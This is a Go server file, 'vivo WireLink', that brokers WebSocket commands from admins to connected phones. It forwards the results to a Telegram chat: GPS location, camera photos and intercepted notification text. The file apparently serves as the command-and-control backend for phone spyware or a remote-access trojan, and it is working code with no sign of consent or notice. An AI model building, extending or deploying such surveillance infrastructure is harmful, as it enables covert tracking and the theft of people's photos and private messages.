// language: Go, file: backend/main.go
// vivo WireLink backend — WebSocket broker + Telegram forwarder.
package main

import (
	"bytes"
	"crypto/sha256"
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"mime/multipart"
	"net/http"
	"os"
	"sync"
	"time"

	"github.com/gorilla/websocket"
)

var (
	adminPassword   string
	adminToken      string
	telegramToken   string
	telegramChatID  string
)

var upgrader = websocket.Upgrader{
	CheckOrigin:     func(r *http.Request) bool { return true },
	ReadBufferSize:  1 << 23, // 8 MB — compressed photos fit fine, base64 padded
	WriteBufferSize: 1 << 23,
}

// Client is one connected websocket peer (keeper or admin).
type Client struct {
	conn *websocket.Conn
	id   string
	role string
	mu   sync.Mutex
}

func (c *Client) Send(v any) error {
	c.mu.Lock()
	defer c.mu.Unlock()
	_ = c.conn.SetWriteDeadline(time.Now().Add(15 * time.Second))
	return c.conn.WriteJSON(v)
}

func (c *Client) Close() {
	c.mu.Lock()
	defer c.mu.Unlock()
	_ = c.conn.Close()
}

var (
	mu      sync.RWMutex
	keepers = map[string]*Client{}
	admins  = map[string]*Client{}
)

// Msg is the wire format for every frame in either direction.
type Msg struct {
	Type     string          `json:"type"`
	ReqID    string          `json:"reqId,omitempty"`
	DeviceID string          `json:"deviceId,omitempty"`
	Command  string          `json:"command,omitempty"`
	Payload  json.RawMessage `json:"payload,omitempty"`
	Success  bool            `json:"success,omitempty"`
	Error    string          `json:"error,omitempty"`
}

func main() {
	adminPassword = os.Getenv("ADMIN_PASSWORD")
	if adminPassword == "" {
		log.Fatal("ADMIN_PASSWORD environment variable is required")
	}
	telegramToken = os.Getenv("TELEGRAM_BOT_TOKEN")
	telegramChatID = os.Getenv("TELEGRAM_CHAT_ID")

	sum := sha256.Sum256([]byte("vivo::" + adminPassword))
	adminToken = hex.EncodeToString(sum[:])

	port := os.Getenv("PORT")
	if port == "" {
		port = "8080"
	}

	mux := http.NewServeMux()
	mux.HandleFunc("/ping", pingHandler)
	mux.HandleFunc("/api/login", loginHandler)
	mux.HandleFunc("/ws/keeper", keeperHandler)
	mux.HandleFunc("/ws/admin", adminHandler)

	log.Printf("vivo WireLink broker listening :%s", port)
	if telegramToken != "" && telegramChatID != "" {
		log.Printf("telegram forwarding enabled -> chat %s", telegramChatID)
	} else {
		log.Printf("telegram forwarding disabled (token or chat id missing)")
	}
	log.Fatal(http.ListenAndServe(":"+port, mux))
}

func pingHandler(w http.ResponseWriter, _ *http.Request) {
	w.WriteHeader(http.StatusOK)
}

func loginHandler(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
		return
	}

	var body struct {
		Password string `json:"password"`
	}
	if err := json.NewDecoder(r.Body).Decode(&body); err != nil {
		http.Error(w, "bad json", http.StatusBadRequest)
		return
	}
	if body.Password != adminPassword {
		http.Error(w, "denied", http.StatusUnauthorized)
		return
	}

	w.Header().Set("Content-Type", "application/json")
	_ = json.NewEncoder(w).Encode(map[string]string{"token": adminToken})
}

func keeperHandler(w http.ResponseWriter, r *http.Request) {
	deviceID := r.URL.Query().Get("deviceId")
	if deviceID == "" {
		http.Error(w, "deviceId required", http.StatusBadRequest)
		return
	}

	conn, err := upgrader.Upgrade(w, r, nil)
	if err != nil {
		return
	}

	c := &Client{conn: conn, id: deviceID, role: "keeper"}

	mu.Lock()
	if old, ok := keepers[deviceID]; ok {
		old.Close()
	}
	keepers[deviceID] = c
	mu.Unlock()
	log.Printf("keeper online: %s", deviceID)

	defer func() {
		mu.Lock()
		if keepers[deviceID] == c {
			delete(keepers, deviceID)
		}
		mu.Unlock()
		_ = conn.Close()
		log.Printf("keeper offline: %s", deviceID)
	}()

	for {
		var m Msg
		if err := conn.ReadJSON(&m); err != nil {
			return
		}

		// keeper -> admins fan-out
		if m.Type == "result" || m.Type == "hello" {
			mu.RLock()
			for _, a := range admins {
				_ = a.Send(m)
			}
			mu.RUnlock()

			// telegram mirror for result frames
			if m.Type == "result" {
				go forwardToTelegram(m)
			}
		}
	}
}

func adminHandler(w http.ResponseWriter, r *http.Request) {
	if r.URL.Query().Get("token") != adminToken {
		http.Error(w, "denied", http.StatusUnauthorized)
		return
	}

	conn, err := upgrader.Upgrade(w, r, nil)
	if err != nil {
		return
	}

	sid := time.Now().Format("150405.000")
	c := &Client{conn: conn, id: sid, role: "admin"}

	mu.Lock()
	admins[sid] = c
	mu.Unlock()
	log.Printf("admin online: %s", sid)

	defer func() {
		mu.Lock()
		delete(admins, sid)
		mu.Unlock()
		_ = conn.Close()
		log.Printf("admin offline: %s", sid)
	}()

	// push current keeper list
	mu.RLock()
	list := make([]string, 0, len(keepers))
	for id := range keepers {
		list = append(list, id)
	}
	mu.RUnlock()
	_ = c.Send(Msg{Type: "keepers", Payload: mustJSON(list)})

	for {
		var m Msg
		if err := conn.ReadJSON(&m); err != nil {
			return
		}
		if m.Type != "command" {
			continue
		}

		mu.RLock()
		var k *Client
		if m.DeviceID != "" {
			k = keepers[m.DeviceID]
		} else {
			for _, kk := range keepers {
				k = kk
				break
			}
		}
		mu.RUnlock()

		if k == nil {
			_ = c.Send(Msg{Type: "error", ReqID: m.ReqID, Error: "no keeper online"})
			continue
		}
		_ = k.Send(m)
	}
}

// ---------- telegram forwarding ----------

func forwardToTelegram(m Msg) {
	if telegramToken == "" || telegramChatID == "" {
		return
	}

	switch m.Command {
	case "location":
		var p struct {
			Lat float64 `json:"lat"`
			Lng float64 `json:"lng"`
			Acc float64 `json:"acc"`
			TS  int64   `json:"ts"`
		}
		if err := json.Unmarshal(m.Payload, &p); err != nil {
			return
		}
		ts := time.UnixMilli(p.TS).Format("2006-01-02 15:04:05")
		caption := fmt.Sprintf("📍 Location\nDevice: %s\nTime: %s\nAcc: ±%.0fm", m.DeviceID, ts, p.Acc)
		tgSendLocation(p.Lat, p.Lng, caption)

	case "camera":
		var p struct {
			Lens string `json:"lens"`
			Mime string `json:"mime"`
			B64  string `json:"b64"`
			TS   int64  `json:"ts"`
		}
		if err := json.Unmarshal(m.Payload, &p); err != nil {
			return
		}
		jpeg, err := base64.StdEncoding.DecodeString(p.B64)
		if err != nil {
			return
		}
		ts := time.UnixMilli(p.TS).Format("2006-01-02 15:04:05")
		caption := fmt.Sprintf("📸 %s camera\nDevice: %s\nTime: %s", p.Lens, m.DeviceID, ts)
		tgSendPhoto(jpeg, caption)

	case "notification":
		var p struct {
			App   string `json:"app"`
			Title string `json:"title"`
			Text  string `json:"text"`
			TS    int64  `json:"ts"`
		}
		if err := json.Unmarshal(m.Payload, &p); err != nil {
			return
		}
		ts := time.UnixMilli(p.TS).Format("2006-01-02 15:04:05")
		text := fmt.Sprintf("🔔 %s\n%s\n%s\n%s", p.App, p.Title, p.Text, ts)
		tgSendMessage(text)
	}
}

func tgSendMessage(text string) {
	url := fmt.Sprintf("https://api.telegram.org/bot%s/sendMessage", telegramToken)
	form := map[string]string{
		"chat_id": telegramChatID,
		"text":    text,
	}
	_ = tgPostForm(url, form, nil, nil)
}

func tgSendLocation(lat, lng float64, caption string) {
	url := fmt.Sprintf("https://api.telegram.org/bot%s/sendLocation", telegramToken)
	form := map[string]string{
		"chat_id":   telegramChatID,
		"latitude":  fmt.Sprintf("%f", lat),
		"longitude": fmt.Sprintf("%f", lng),
	}
	// sendLocation doesn't accept caption in all bot api versions; send as follow-up if present
	_ = tgPostForm(url, form, nil, nil)
	if caption != "" {
		tgSendMessage(caption)
	}
}

func tgSendPhoto(jpeg []byte, caption string) {
	url := fmt.Sprintf("https://api.telegram.org/bot%s/sendPhoto", telegramToken)
	fields := map[string]string{
		"chat_id": telegramChatID,
		"caption": caption,
	}
	_ = tgPostForm(url, fields, "photo", jpeg)
}

// tgPostForm sends either urlencoded (fileField == "") or multipart (fileField != "").
func tgPostForm(url string, fields map[string]string, fileField string, fileData []byte) error {
	client := &http.Client{Timeout: 30 * time.Second}

	if fileField == "" {
		body := &bytes.Buffer{}
		first := true
		for k, v := range fields {
			if !first {
				body.WriteByte('&')
			}
			first = false
			body.WriteString(urlEncode(k))
			body.WriteByte('=')
			body.WriteString(urlEncode(v))
		}
		req, _ := http.NewRequest("POST", url, body)
		req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
		resp, err := client.Do(req)
		if err != nil {
			return err
		}
		defer resp.Body.Close()
		_, _ = io.Copy(io.Discard, resp.Body)
		return nil
	}

	body := &bytes.Buffer{}
	w := multipart.NewWriter(body)
	for k, v := range fields {
		_ = w.WriteField(k, v)
	}
	fw, err := w.CreateFormFile(fileField, "photo.jpg")
	if err != nil {
		return err
	}
	if _, err := fw.Write(fileData); err != nil {
		return err
	}
	_ = w.Close()

	req, _ := http.NewRequest("POST", url, body)
	req.Header.Set("Content-Type", w.FormDataContentType())
	resp, err := client.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()
	_, _ = io.Copy(io.Discard, resp.Body)
	return nil
}

func urlEncode(s string) string {
	const hex = "0123456789ABCDEF"
	var b bytes.Buffer
	for i := 0; i < len(s); i++ {
		c := s[i]
		if (c >= 'A' && c <= 'Z') || (c >= 'a' && c <= 'z') || (c >= '0' && c <= '9') ||
			c == '-' || c == '_' || c == '.' || c == '~' {
			b.WriteByte(c)
		} else if c == ' ' {
			b.WriteByte('+')
		} else {
			b.WriteByte('%')
			b.WriteByte(hex[c>>4])
			b.WriteByte(hex[c&0x0F])
		}
	}
	return b.String()
}

func mustJSON(v any) json.RawMessage {
	b, _ := json.Marshal(v)
	return b
}
